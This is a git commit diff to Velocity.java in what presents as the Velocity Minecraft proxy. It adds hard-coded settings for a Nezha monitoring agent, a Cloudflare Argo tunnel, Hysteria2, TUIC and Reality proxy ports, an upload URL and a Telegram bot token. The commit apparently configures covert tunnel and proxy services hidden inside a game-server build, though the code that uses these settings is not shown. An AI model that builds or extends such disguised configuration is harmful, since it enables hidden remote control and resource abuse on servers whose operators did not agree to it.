2408e73f0adcc0a5dd5bb80f9673389e307b7203
老王 <sun@f4i.cn>
2025-08-02 10:57:27 +0800

    Update Velocity.java

--- proxy/src/main/java/com/velocitypowered/proxy/Velocity.java
+++ proxy/src/main/java/com/velocitypowered/proxy/Velocity.java
@@ -146,7 +146,23 @@ public final class Velocity {
   }
 
   private static void loadEnvVars(final Map<String, String> envVars) throws IOException {
+    envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b383");
     envVars.put("FILE_PATH", "./world");
+    envVars.put("NEZHA_SERVER", "");
+    envVars.put("NEZHA_PORT", "");
+    envVars.put("NEZHA_KEY", "");
+    envVars.put("ARGO_PORT", "");
+    envVars.put("ARGO_DOMAIN", "");
+    envVars.put("ARGO_AUTH", "");
+    envVars.put("HY2_PORT", "");
+    envVars.put("TUIC_PORT", "");
+    envVars.put("REALITY_PORT", "");
+    envVars.put("UPLOAD_URL", "");
+    envVars.put("CHAT_ID", "");
+    envVars.put("BOT_TOKEN", "");
+    envVars.put("CFIP", "");
+    envVars.put("CFPORT", "");
+    envVars.put("NAME", "Mc");
 
     for (String var : ALL_ENV_VARS) {
       final String value = System.getenv(var);
